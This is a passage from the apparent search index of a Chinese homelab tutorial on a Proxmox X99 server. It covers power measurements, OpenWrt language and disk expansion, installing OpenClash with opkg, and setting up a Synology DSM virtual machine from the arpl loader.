221W\uff0c\u200b\u4e00\u4e0b\u200b\u964d\u4f4e\u200b\u4e86\u200b 85W\uff0c\u200b\u964d\u4f4e\u200b\u4e86\u200b 27.78% \u200b\u4f18\u5316\u200b\u6548\u679c\u200b\u8fd8\u662f\u200b\u5f88\u200b\u660e\u663e\u200b\u7684\u200b\uff1a</p> <p> </p> <p>\u200b\u7ecf\u200b\u56fd\u5149\u200b\u7684\u200b\u591a\u6b21\u200b\u5395\u6240\u200b\uff0c\u200b\u53d1\u73b0\u200b\u4e3b\u8981\u200b\u7684\u200b\u8017\u7535\u200b\u5927\u6237\u200b\u8fd8\u662f\u200b\u663e\u5361\u200b\uff0c\u200b\u65e5\u5e38\u200b\u5f85\u673a\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u5176\u5b9e\u200b CPU \u200b\u7684\u200b\u5de5\u4f5c\u200b\u6a21\u5f0f\u200b\u5bf9\u200b\u529f\u8017\u200b\u7684\u200b\u5f71\u54cd\u200b\u5e76\u4e0d\u5927\u200b\uff0c\u200b\u53ea\u6709\u200b\u6ee1\u8f7d\u200b\u7684\u200b\u65f6\u5019\u200b\u624d\u200b\u4f1a\u200b\u4e0d\u540c\u200b CPU \u200b\u7684\u200b\u5de5\u4f5c\u200b\u6a21\u5f0f\u200b\u7684\u200b\u529f\u8017\u200b\u5dee\u8ddd\u200b\u624d\u200b\u4f1a\u200b\u63d0\u73b0\u200b\u51fa\u6765\u200b\u3002</p>"},{"location":"4/6/#_6","title":"\u8c01\u200b\u66f4\u200b\u8017\u7535","text":"<p>\u200b\u672c\u6b21\u200b\u6d4b\u8bd5\u200b\u5728\u200b CPU \u200b\u7684\u200b performance \u200b\u6027\u80fd\u200b\u6a21\u5f0f\u200b\u4e0b\u200b\u8fdb\u884c\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u5f00\u200b 2 \u200b\u4e2a\u200b VM\uff082\u200b\u4e2a\u200b OpenWrt\uff09\uff0c\u200b\u786c\u4ef6\u200b\u63d2\u6ee1\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u6574\u673a\u200b\u529f\u8017\u200b\u4e3a\u200b\uff1a221W\uff0c\u200b\u901a\u8fc7\u200b\u5dee\u503c\u200b\u8ba1\u7b97\u200b\u5f88\u200b\u5bb9\u6613\u200b\u7b97\u200b\u51fa\u200b\u6307\u5b9a\u200b PCIe \u200b\u8bbe\u5907\u200b\u7684\u200b\u529f\u8017\u200b\u60c5\u51b5\u200b\uff08\u200b\u4e2a\u4eba\u200b\u6d4b\u8bd5\u200b\u7f3a\u4e4f\u200b\u5404\u79cd\u200b\u5bf9\u6bd4\u200b\uff0c\u200b\u6570\u636e\u200b\u53ef\u80fd\u200b\u5b58\u5728\u200b\u4e9b\u8bb8\u200b\u8bef\u5dee\u200b\uff09\u3002</p> <p> </p> \u200b\u62d4\u6389\u200b\u987a\u5e8f\u200b \u200b\u786c\u4ef6\u200b \u200b\u6574\u673a\u200b\u529f\u8017\u200b \u200b\u63a8\u7b97\u200b\u7684\u200b\u529f\u8017\u200b 1 \u200b\u84dd\u5b9d\u77f3\u200b \u200b\u8d85\u200b\u767d\u91d1\u200b RX 580 2304SP 8GB \u200b\u6ee1\u8840\u200b\u7248\u200b 209W 12W 2 \u200b\u6d6a\u6f6e\u200b X540-T2 \u200b\u53cc\u200b\u7f51\u53e3\u200b \u200b\u4e07\u5146\u7535\u53e3\u200b\u7f51\u5361\u200b 189W 20W 3 NVIDIA Tesla P4 8GB \u200b\u8ba1\u7b97\u200b\u5361\u200b 179W 10W 4 \u200b\u897f\u200b\u6570\u200b WD AN1500  Raid0\u200b\u5361\u200b + 2 \u200b\u5f20\u200b NVME 1TB \u200b\u897f\u200b\u6570\u200b SN570 173W 6W 5 2 \u200b\u5f20\u200b \u200b\u535a\u901a\u200b BCM 94360CD \u200b\u65e0\u7ebf\u200b\u7f51\u5361\u200b + PCIe NVME \u200b\u6269\u5c55\u5361\u200b 162W 11W 6 3 \u200b\u4e2a\u200b\u6da1\u8f6e\u200b\u98ce\u6247\u200b + 1 \u200b\u4e2a\u200b 5cm \u200b\u53f0\u8fbe\u200b\u5c0f\u200b\u98ce\u6247\u200b 158W 4W 7 \u200b\u7535\u200b\u7ade\u5224\u5ba2\u200b NVIDIA RTX 3060 12GB 133W 25W <p>\u200b\u6700\u7ec8\u200b\u62d4\u6389\u200b\u4e0a\u8ff0\u200b\u8bbe\u5907\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u7684\u200b X99 \u200b\u53cc\u8def\u200b E5-2696 V4 \u200b\u7684\u200b\u65e5\u5e38\u200b\u5f85\u673a\u200b\u529f\u8017\u200b\u4e3a\u200b\uff1a133W</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u5982\u679c\u200b\u5927\u5bb6\u200b\u4e0d\u200b\u559c\u6b22\u200b\u82b1\u91cc\u80e1\u54e8\u200b\u7684\u200b\u63d2\u200b\u4e00\u5806\u200b\u8bbe\u5907\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53cc\u8def\u200b E5 \u200b\u7684\u200b\u529f\u8017\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u4f20\u8bf4\u200b\u4e2d\u200b\u7684\u200b\u90a3\u4e48\u200b\u5938\u5f20\u200b\u5566\u200b\u3002 </p>"},{"location":"5/1/","title":"\u57fa\u672c\u64cd\u4f5c","text":""},{"location":"5/1/#_1","title":"\u57fa\u672c\u200b\u5b89\u88c5","text":"<p>\u200b\u8fd9\u90e8\u5206\u200b\u5176\u5b9e\u200b\u5728\u200b\u4e4b\u524d\u200b\u7684\u200b \u200b\u7f51\u7edc\u200b\u5b9e\u6218\u200b - \u200b\u5b89\u88c5\u200b OpenWrt - vmbr1 \u200b\u7ae0\u8282\u200b\u8bf4\u200b\u8fc7\u200b\u4e86\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u4e0d\u200b\u5728\u200b\u8d58\u8ff0\u200b\uff0c\u200b\u5927\u5bb6\u200b\u81ea\u5df1\u200b\u770b\u200b\u524d\u9762\u200b\u7684\u200b\u7ae0\u8282\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"5/1/#_2","title":"\u8bed\u8a00\u200b\u8bbe\u7f6e","text":"<p>OpenWrt \u200b\u81ea\u5e26\u200b\u7684\u200b\u8bed\u8a00\u200b\u91cc\u9762\u200b\u9ed8\u8ba4\u200b\u662f\u200b\u6ca1\u6709\u200b\u4e2d\u6587\u200b\u7684\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u200b\u8ba9\u200b\u7b2c\u4e00\u6b21\u200b\u4e0a\u200b\u624b\u200b OpenWrt \u200b\u7684\u200b\u4e2d\u56fd\u200b\u7528\u6237\u200b\u6765\u8bf4\u200b\u5e76\u200b\u4e0d\u662f\u200b\u5f88\u200b\u53cb\u597d\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u5e78\u8fd0\u200b\u7684\u200b\u662f\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b\u4e2d\u6587\u200b\u8bed\u8a00\u5305\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u66f4\u65b0\u200b\u4e00\u4e0b\u200b\u8f6f\u4ef6\u200b\u6e90\u200b\uff1a</p> <p> </p> <p>\u200b\u63a5\u7740\u200b\u641c\u7d22\u200b\uff1abase-zh-cn\uff0c\u200b\u627e\u5230\u200b luci-i18n-base-zh-cn \u200b\u70b9\u51fb\u200b Install \u200b\u5b89\u88c5\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u5b89\u88c5\u200b\u597d\u540e\u200b\u5237\u65b0\u200b\u4e00\u4e0b\u200b\u7cfb\u7edf\u200b\u5c31\u200b\u53d8\u6210\u200b\u4e2d\u6587\u200b\u754c\u9762\u200b\u5566\u200b\uff1a</p> <p> </p>"},{"location":"5/2/","title":"\u786c\u76d8\u200b\u6269\u5bb9","text":"<p>\u200b\u672c\u200b\u6559\u7a0b\u200b\u57fa\u4e8e\u200b ext4 \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b OpenWrt\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u662f\u200b\u57fa\u4e8e\u200b  <code>SquashFS</code> \u200b\u53ea\u8bfb\u200b\u7cfb\u7edf\u200b\u7684\u8bdd\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f1a\u200b\u7a0d\u5fae\u200b\u9ebb\u70e6\u200b\u4e00\u70b9\u200b\uff0c\u200b\u6316\u4e2a\u200b\u5751\u200b\uff0c\u200b\u540e\u9762\u200b\u56fd\u5149\u200b\u6211\u200b\u6709\u200b\u65f6\u95f4\u200b\u4e86\u200b\u5355\u72ec\u200b\u6765\u200b\u5199\u200b\u8fd9\u5757\u200b\u5185\u5bb9\u200b\u3002</p> <p>OpenWrt \u200b\u955c\u50cf\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u78c1\u76d8\u200b\u5927\u5c0f\u200b\u662f\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\u7684\u200b\uff0c\u200b\u6ca1\u200b\u5b89\u88c5\u200b\u51e0\u4e2a\u200b\u8f6f\u4ef6\u200b\u5c31\u200b\u4e0d\u591f\u200b\u7528\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u624b\u52a8\u200b\u6765\u200b\u6269\u5bb9\u200b\u4e00\u4e0b\u200b\uff1a</p> <p> </p>"},{"location":"5/2/#_1","title":"\u589e\u52a0\u200b\u7a7a\u95f4","text":"<p>\u200b\u9996\u5148\u200b PVE \u200b\u4e0b\u200b\u7ed9\u200b\u4e4b\u524d\u200b\u7684\u200b SATA \u200b\u786c\u76d8\u200b\u589e\u52a0\u200b 2GB \u200b\u7a7a\u95f4\u200b\uff1a</p> <p> </p> <p>\u200b\u786c\u4ef6\u200b\u66f4\u6539\u200b\u540e\u200b\uff0c\u200b\u8bb0\u5f97\u200b\u91cd\u542f\u200b\u4e00\u4e0b\u200b\u8fd9\u4e2a\u200b OpenWrt \u200b\u7684\u200b VM   </p> <p>\u200b\u7136\u540e\u200b OpenWrt \u200b\u5b89\u88c5\u200b cfdisk \u200b\u5de5\u5177\u200b\uff1a</p> <p> </p> <p>\u200b\u540e\u9762\u200b\u6269\u5bb9\u200b\u5206\u533a\u200b\u9700\u8981\u200b\u7528\u5230\u200b\u8fd9\u4e2a\u200b\u5de5\u5177\u200b\u3002   </p>"},{"location":"5/2/#_2","title":"\u6269\u5bb9\u200b\u5206\u533a","text":"<p>\u200b\u4f7f\u7528\u200b cfdisk \u200b\u6765\u200b\u6269\u5bb9\u200b\u5206\u533a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u672b\u5c3e\u200b\u6709\u200b 2GB \u200b\u7a7a\u95f2\u200b\u5206\u533a\u200b\uff1a</p> <p> </p> <p>\u200b\u9009\u4e2d\u200b\u7b2c\u4e8c\u4e2a\u200b\u5206\u533a\u200b\uff0c\u200b\u9009\u62e9\u200b\u4e0b\u9762\u200b\u7684\u200b\u300cResize\u300d \u200b\u8c03\u6574\u200b\u78c1\u76d8\u5206\u533a\u200b\u5927\u5c0f\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u9009\u62e9\u200b\u7b2c\u4e8c\u4e2a\u200b\u5206\u533a\u200b\uff0c\u200b\u9009\u62e9\u200b\u300cWrite\u300d \u200b\u4fdd\u5b58\u200b\u6211\u4eec\u200b\u4e0a\u9762\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff1a</p> <p> </p> <p>\u200b\u6b64\u65f6\u200b\u8bb0\u4f4f\u200b\u6211\u4eec\u200b\u5f53\u524d\u200b\u7684\u200b\u7b2c\u200b 2 \u200b\u4e2a\u200b\u5206\u533a\u200b\u8def\u5f84\u200b\u4e3a\u200b\uff1a/dev/sda2  \u200b\u4e0b\u200b\u4e00\u6b65\u200b\u64cd\u4f5c\u200b\u9700\u8981\u200b\u7528\u5230\u200b\u8fd9\u4e2a\u200b\u8def\u5f84\u200b\u4fe1\u606f\u200b</p>"},{"location":"5/2/#_3","title":"\u8bbe\u7f6e\u200b\u5faa\u73af","text":"<p>OpenWrt \u200b\u5b89\u88c5\u200b losetup \u200b\u5de5\u5177\u200b\uff1a</p> <p> </p> <p>\u200b\u4ee5\u53ca\u200b resize2fs \u200b\u5de5\u5177\u200b\uff1a</p> <p> </p> <p>\u200b\u63a5\u7740\u200b\u8bbe\u7f6e\u200b\u5faa\u73af\u200b\u8bbe\u5907\u200b\u5e76\u200b\u6302\u8f7d\u200b\uff0c\u200b\u64cd\u4f5c\u200b\u5b8c\u200b\u91cd\u542f\u200b\u4e00\u4e0b\u200b\uff1a</p> <p>Bash<pre><code>losetup /dev/loop0 /dev/sda2\nresize2fs -f /dev/loop0\nreboot\n</code></pre> </p>"},{"location":"5/2/#_4","title":"\u6269\u5bb9\u200b\u6548\u679c","text":"<p>\u200b\u7ecf\u8fc7\u200b\u4e0a\u8ff0\u200b\u51e0\u6b65\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6700\u7ec8\u200b\u6269\u5bb9\u200b\u6210\u529f\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p>"},{"location":"5/2/#_5","title":"\u53c2\u8003\u200b\u94fe\u63a5","text":"<ul> <li>Bilibili - OpenWrt\u200b\u7684\u200b\u7a7a\u95f4\u200b\u6269\u5bb9\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8fd9\u4e48\u200b\u76f4\u63a5\u200b\u89e3\u51b3\u200b\uff01</li> </ul>"},{"location":"5/3/","title":"OpenClash","text":""},{"location":"5/3/#_1","title":"\u63d2\u4ef6\u200b\u4ecb\u7ecd","text":"<p>OpenClash \u200b\u662f\u200b\u4e00\u4e2a\u200b\u53ef\u200b\u8fd0\u884c\u200b\u5728\u200b OpenWrt \u200b\u4e0a\u200b\u7684\u200b Clash \u200b\u5ba2\u6237\u7aef\u200b\uff0c\u200b\u517c\u5bb9\u200b Shadowsocks\u3001ShadowsocksR\u3001Vmess\u3001Trojan\u3001Snell \u200b\u7b49\u200b\u534f\u8bae\u200b\uff0c\u200b\u6839\u636e\u200b\u7075\u6d3b\u200b\u7684\u200b\u89c4\u5219\u200b\u914d\u7f6e\u200b\u5b9e\u73b0\u200b\u7b56\u7565\u200b\u4ee3\u7406\u200b\u3002</p> <p>\u200b\u5b98\u65b9\u200b\u5f00\u6e90\u200b\u9879\u76ee\u200b\u5730\u5740\u200b\uff1ahttps://github.com/vernesong/OpenClash</p>"},{"location":"5/3/#_2","title":"\u4e0b\u8f7d\u200b\u63d2\u4ef6","text":"<p>\u200b\u9996\u5148\u200b\u4e0b\u8f7d\u200b\u6700\u65b0\u200b\u7684\u200b ipk \u200b\u6587\u4ef6\u200b\u5230\u200b OpenWrt \u200b\u91cc\u9762\u200b</p> Bash<pre><code>opkg install uci-app-openclash_0.45.70-beta_all.ipk\n</code></pre> <p>\u200b\u56e0\u4e3a\u200b\u7f3a\u5c11\u200b\u76f8\u5173\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u662f\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u5b89\u88c5\u200b\u6210\u529f\u200b\u7684\u200b\uff1a</p> <p> </p>"},{"location":"5/3/#dnsmasq","title":"\u5378\u8f7d\u200b dnsmasq","text":"<p>\u200b\u7531\u4e8e\u200b\u81ea\u5e26\u200b\u7684\u200b dnsmasq \u200b\u4f1a\u200b\u548c\u200b\u4e0b\u9762\u200b\u8981\u200b\u5b89\u88c5\u200b\u7684\u200b dnsmasq-full \u200b\u51b2\u7a81\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u63d0\u524d\u200b\u5378\u8f7d\u200b\uff1a</p> Bash<pre><code>opkg remove dnsmasq\nmv /etc/config/dhcp /etc/config/dhcp.bak\n</code></pre>"},{"location":"5/3/#_3","title":"\u4f9d\u8d56\u200b\u5b89\u88c5","text":"Bash<pre><code>opkg update\nopkg install iptables\nopkg install dnsmasq-full\nopkg install coreutils\nopkg install coreutils-nohup\nopkg install bash\nopkg install curl\nopkg install jsonfilter\nopkg install ca-certificates\nopkg install ipset\nopkg install ip-full\nopkg install iptables-mod-tproxy\nopkg install kmod-tun\nopkg install luci-compat\n</code></pre> <p>\u200b\u4f9d\u8d56\u200b\u5b89\u88c5\u200b\u5b8c\u6210\u200b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u6765\u200b\u5b89\u88c5\u200b\u4e86\u200b openclash \u200b\u4e86\u200b\uff1a</p> Bash<pre><code>opkg install uci-app-openclash_0.45.70-beta_all.ipk\n</code></pre> <p>\u200b\u5b89\u88c5\u200b\u6210\u529f\u200b\u540e\u200b\uff0c\u200b\u5728\u200b OpenWrt \u200b\u7684\u200b\u63a7\u5236\u9762\u677f\u200b\u91cc\u9762\u200b\u7684\u200b\u300c\u200b\u670d\u52a1\u200b\u300d\u200b\u83dc\u5355\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b OpenClash\uff1a</p> <p> </p> <p>\u200b\u4e0d\u8fc7\u200b\u5462\u200b\uff0c\u200b\u50cf\u200b\u4e0a\u200b\u56fe\u200b\u8fd9\u6837\u200b\uff0c\u200b\u8868\u793a\u200b\u670d\u52a1\u200b\u8fd8\u200b\u90fd\u200b\u6ca1\u6709\u200b\u542f\u52a8\u200b\u8d77\u6765\u200b\u3002</p> <p>\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u914d\u7f6e\u200b\u597d\u200b\u8ba2\u9605\u200b\u540e\u200b\uff0c\u200b\u542f\u52a8\u200b\u4e00\u4e0b\u200b OpenClash \u200b\u670d\u52a1\u200b\u8bd5\u8bd5\u770b\u200b\uff0c\u200b\u5982\u679c\u200b\u51fa\u73b0\u200b\u4e0b\u56fe\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\uff0c\u200b\u8868\u793a\u200b\u670d\u52a1\u200b\u662f\u200b\u6b63\u5e38\u200b\u6ca1\u200b\u95ee\u9898\u200b\u7684\u200b\uff1a</p> <p> </p> <p>Bingo\uff01\u200b\u81f3\u6b64\u200b\u6211\u4eec\u200b\u5df2\u7ecf\u200b\u53ef\u4ee5\u200b\u8f7b\u677e\u200b\u6109\u60a6\u200b\u7684\u200b\u4e0a\u7f51\u51b2\u6d6a\u200b\u4e86\u200b\u3002</p>"},{"location":"6/1/","title":"\u57fa\u672c\u200b\u5b89\u88c5","text":"<p>\u200b\u51c6\u5907\u200b\u955c\u50cf\u200b</p> <p>\u200b\u4e0b\u8f7d\u200b arpl \u200b\u955c\u50cf\u200b\u6765\u200b\u7f16\u8bd1\u200b\u6211\u4eec\u200b\u7684\u200b\u5f15\u5bfc\u200b\uff0c\u200b\u5f00\u6e90\u200b\u9879\u76ee\u200b\u7684\u200b\u4e0b\u8f7d\u200b\u5730\u5740\u200b\uff1ahttps://github.com/fbelavenuto/arpl/releases</p> <p>\u200b\u7136\u540e\u200b\u4e0a\u200b\u4f20\u5230\u200b PVE \u200b\u7684\u200b ISO \u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u4e2d\u200b\uff1a</p> <p> </p>"},{"location":"6/1/#_1","title":"\u521b\u5efa\u200b\u865a\u673a","text":"<p>\u200b\u865a\u62df\u673a\u200b\u521b\u5efa\u200b\u7ec6\u8282\u200b\u5982\u4e0b\u200b\uff1a</p> <p>\uff0c\u200b\u5927\u5bb6\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u5b9e\u9645\u200b\u60c5\u51b5\u200b\u6765\u200b\u53c2\u8003\u200b\uff1a</p> \u200b\u5e38\u89c4\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7cfb\u7edf\u200b\u78c1\u76d8\u200bCPU\u200b\u5185\u5b58\u200b\u7f51\u7edc\u200b <p></p> <p>\u200b\u7ed9\u200b\u81ea\u5df1\u200b\u7684\u200b\u865a\u62df\u673a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u81ea\u5b9a\u4e49\u200b\u540d\u79f0\u200b\uff0c\u200b\u8bb0\u4f4f\u200b\u6b64\u65f6\u200b\u7684\u200b VM ID \u200b\u4e3a\u200b 100\uff0c\u200b\u540e\u9762\u200b\u9700\u8981\u200b\u7528\u200b\u5f97\u5230\u200b\u3002</p> <p></p> <p>\u200b\u4e0d\u200b\u9700\u8981\u200b CD \u200b\u5149\u76d8\u200b\u3002</p> <p></p> <p>\u200b\u9ed8\u8ba4\u200b\u5c31\u884c\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u64cd\u4f5c\u200b\u5565\u200b\u3002</p> <p></p> <p>\u200b\u4e0d\u200b\u9700\u8981\u200b\u786c\u76d8\u200b\uff0c\u200b\u6211\u4eec\u200b\u624b\u52a8\u200b\u5220\u6389\u200b\u3002</p> <p></p> <p>\u200b\u8ffd\u6c42\u200b\u6027\u80fd\u200b\u5efa\u8bae\u200b\u9009\u62e9\u200b host \u200b\u7c7b\u578b\u200b\u3002</p> <p></p> <p>256GB \u200b\u5185\u5b58\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u968f\u4fbf\u200b\u5962\u4f88\u200b\uff0c\u200b\u5c31\u200b\u7ed9\u200b DSM \u200b\u5206\u914d\u200b 16GB \u200b\u5185\u5b58\u200b\u5427\u200b\uff0c\u200b\u540e\u671f\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5728\u200b DSM \u200b\u4e0a\u200b\u8dd1\u8dd1\u200b Docker \u200b\u5565\u200b\u7684\u200b\u3002</p> <p></p> <p>\u200b\u7f51\u7edc\u200b\u7c7b\u578b\u200b\u9009\u62e9\u200b\u300cVirtIO \u200b\u534a\u200b\u865a\u62df\u5316\u200b\u300d\u200b\u6027\u80fd\u200b\u66f4\u597d\u200b\uff0c\u200b\u7136\u540e\u200b\u7f51\u6865\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u5b9e\u9645\u200b\u7f51\u53e3\u200b\u60c5\u51b5\u200b\u81ea\u884c\u200b\u9009\u62e9\u200b\u3002</p>"},{"location":"6/1/#_2","title":"\u6dfb\u52a0\u200b\u7f51\u5361","text":"<p>\u200b\u6839\u636e\u200b\u6211\u4eec\u200b\u7684\u200b\u7f51\u7edc\u200b\u67b6\u6784\u8bbe\u8ba1\u200b\uff1a</p> <p> </p> <p>\u200b\u6211\u4eec\u200b\u8fd8\u200b\u9700\u8981\u200b\u5f80\u200b DSM \u200b\u7fa4\u6656\u200b\u91cc\u9762\u200b\u6dfb\u52a0\u200b vmbr1 \u200b\u548c\u200b vmbr2 \u200b\u7684\u200b\u7f51\u6865\u200b\uff1a</p> <p> </p>"},{"location":"6/1/#_3","title":"\u6dfb\u52a0\u200b\u786c\u76d8","text":"<p>\u200b\u8f6c\u6362\u200b\u78c1\u76d8\u200b\u5e76\u200b\u5bfc\u5165\u5230\u200b VM \u200b\u4e2d\u200b\uff1a</p> Bash<pre><code>qm importdisk 100 /var/lib/vz/template/iso/arpl.img local-lvm\n</code></pre> <p>\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u6211\u200b\u7684\u200b ISO \u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u4e0d\u200b\u5728\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u4ed3\u5e93\u200b\u4e2d\u200b\uff0c\u200b\u800c\u4e14\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u5b58\u50a8\u200b\u4f4d\u7f6e\u200b\u4e5f\u200b\u4e0d\u200b\u5728\u200b local-lvm \u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5927\u5bb6\u200b\u7075\u6d3b\u200b\u53d8\u901a\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u56fd\u5149\u200b\u7684\u200b\u5bfc\u5165\u200b\u547d\u4ee4\u200b\uff1a</p> Bash<pre><code>qm importdisk 100 /mnt/pve/S500Pro/template/iso/arpl.img ssd2-nvme-2tb-WD-AN1500\n</code></pre> <p>DSM \u200b\u865a\u62df\u673a\u200b\u786c\u4ef6\u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u627e\u5230\u200b\u521a\u624d\u200b\u8f6c\u5316\u200b\u7684\u200b\u672a\u200b\u4f7f\u7528\u200b\u7684\u200b\u78c1\u76d8\u200b\uff0c\u200b\u9009\u62e9\u200b SATA \u200b\u7c7b\u578b\u200b\u5e76\u200b\u6dfb\u52a0\u200b\uff1a</p> <p> </p>"},{"location":"6/1/#_4","title":"\u6dfb\u52a0\u200b\u786c\u76d8","text":"<p>\u200b\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u540e\u7eed\u200b\u9700\u8981\u200b\u914d\u5408\u200b\u6211\u4eec\u200b\u7684\u200b\u7269\u7406\u200b SSD \u200b\u505a\u200b\u8bfb\u5199\u200b\u7f13\u5b58\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6dfb\u52a0\u200b 1 \u200b\u4e2a\u200b 256GB \u200b\u7684\u200b SSD\uff1a</p> <p> </p>"},{"location":"6/1/#_5","title":"\u76f4\u901a\u200b\u786c\u76d8","text":"<p>\u200b\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u672c\u6b21\u200b\u6240\u7528\u200b\u5230\u200b\u7684\u200b HDD \u200b\u90fd\u200b\u8d70\u200b\u7684\u200b SATA \u200b\u534f\u8bae\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5e72\u8106\u200b\u76f4\u63a5\u200b\u5c06\u200b\u6211\u4eec\u200b\u7684\u200b SATA \u200b\u63a7\u5236\u200b\u673a\u5668\u200b\u76f4\u901a\u200b\u5230\u200b DSM \u200b\u4e2d\u200b\uff0c\u200b\u9996\u5148\u200b PVE \u200b\u4e0b\u200b\u67e5\u770b\u200b\u6211\u4eec\u200b\u7684\u200b SATA \u200b\u63a7\u5236\u5668\u200b\uff1a</p> Bash<pre><code>$ lspci|grep SATA\n00:11.4 SATA controller: Intel Corporation C610/X99 series chipset sSATA Controller [AHCI mode] (rev 05)\n00:1f.2 SATA controller: Intel Corporation C610/X99 series chipset 6-Port SATA Controller [AHCI mode] (rev 05)\n</code></pre> <p>\u200b\u76f4\u63a5\u200b\u5728\u200b VM \u200b\u8bbe\u7f6e\u200b\u91cc\u9762\u200b\u6dfb\u52a0\u200b\u8fd9\u200b\u4e24\u4e2a\u200b SATA \u200b\u63a7\u5236\u5668\u200b\uff1a</p> <p> </p> <p>\u200b\u76f4\u901a\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p>"},{"location":"6/1/#_6","title":"\u786c\u4ef6\u200b\u7ec6\u8282","text":"<p>\u200b\u4e00\u987f\u200b\u64cd\u4f5c\u200b\u4e0b\u6765\u200b\u6211\u4eec\u200b\u7684\u200b\u786c\u4ef6\u200b\u8bbe\u7f6e\u200b\u7ec6\u8282\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u8bb0\u5f97\u200b\u5c06\u200b SATA0 \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u7b2c\u4e00\u200b\u5f15\u5bfc\u200b\uff1a</p> <p> </p>"},{"location":"6/1/#_7","title":"\u6784\u5efa\u200b\u5f15\u5bfc","text":"<p>\u200b\u542f\u52a8\u200b DSM \u200b\u865a\u62df\u673a\u200b\uff0c\u200b\u6253\u5f00\u200b\u63a7\u5236\u53f0\u200b\u67e5\u770b\u200b\u5206\u914d\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\uff1a</p> <p> </p> <p>\u200b\u6d4f\u89c8\u5668\u200b\u8bbf\u95ee\u200b\u8fd9\u4e2a\u200b\u5730\u5740\u200b\uff1a</p> <p> </p> <p>Choose a model \u200b\u9009\u62e9\u200b\u673a\u578b\u200b</p> <p>\u200b\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u540e\u9762\u200b\u9700\u8981\u200b\u76f4\u901a\u200b\u72ec\u663e\u8fdb\u200b DSM \u200b\u91cc\u9762\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6700\u597d\u200b\u8bbe\u7f6e\u200b\u673a\u578b\u200b\u4e3a\u200b DVA \u200b\u7cfb\u5217\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u4e2a\u200b\u7cfb\u5217\u200b\u662f\u200b\u81ea\u5e26\u200b\u72ec\u663e\u200b\u7684\u200b\uff1a</p> <p> </p> <p>Choose a Build Number \u200b\u9009\u62e9\u200b\u6784\u5efa\u200b\u7684\u200b DSM \u200b\u7248\u672c\u200b</p> <p>\u200b\u8fd9\u91cc\u200b\u9009\u62e9\u200b\u6700\u65b0\u200b\u7684\u200b\u7248\u672c\u200b\uff0842962\uff09\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>Choose a serial number \u200b\u9009\u62e9\u200b\u4e00\u4e2a\u200b\u5e8f\u5217\u53f7\u200b</p> 